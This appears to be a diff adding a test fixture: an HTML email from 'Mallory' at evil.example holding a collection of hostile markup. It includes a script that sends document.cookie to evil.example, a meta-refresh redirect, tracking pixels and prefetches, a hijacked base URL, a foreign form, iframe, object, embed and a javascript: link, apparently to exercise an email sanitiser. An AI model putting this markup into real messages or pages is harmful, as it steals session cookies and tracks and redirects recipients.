@@ -1,0 +1,8 @@
+From: Mallory <m@evil.example>
+To: owner@example.com
+Subject: Click me
+Date: Tue, 27 Oct 2026 16:00:00 +0000
+Message-ID: <hostile@evil.example>
+Content-Type: text/html; charset=utf-8
+
+<html><head><meta http-equiv="refresh" content="0;url=https://t.evil.example/u/abc123"><link rel="dns-prefetch" href="//abc123.t.evil.example"><link rel="preconnect" href="https://t.evil.example"><base href="https://evil.example/"><style>p{color:red}</style></head><body><script>fetch('https://evil.example/'+document.cookie)</script><img src="https://tracker.evil.example/p.gif"><form action="https://evil.example"><input name=x></form><iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/o"></object><embed src="https://evil.example/e"><p>Hello</p><a href="https://example.com/a" target="_self">one</a> <a href="javascript:alert(1)">two</a><a name="anchor">no href</a></body></html>
